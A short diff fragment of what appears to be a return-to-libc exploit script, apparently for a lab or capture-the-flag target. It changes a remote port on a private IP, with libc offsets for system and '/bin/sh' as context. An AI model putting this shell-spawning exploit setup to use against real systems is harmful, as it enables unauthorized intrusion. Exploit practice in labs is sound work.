@@ -66,7 +66,7 @@ def __main__():
 		SYSTEM_OFFSET = 0x055410
 		STR_BIN_SH_OFFSET = 0x1b75aa
 	else:
-		p = remote('192.168.1.9', 22221)
+		p = remote('192.168.1.9', 22222)
 		WRITE_OFFSET = 0x1111d0
 		SYSTEM_OFFSET = 0x055410
 		STR_BIN_SH_OFFSET = 0x1b75aa
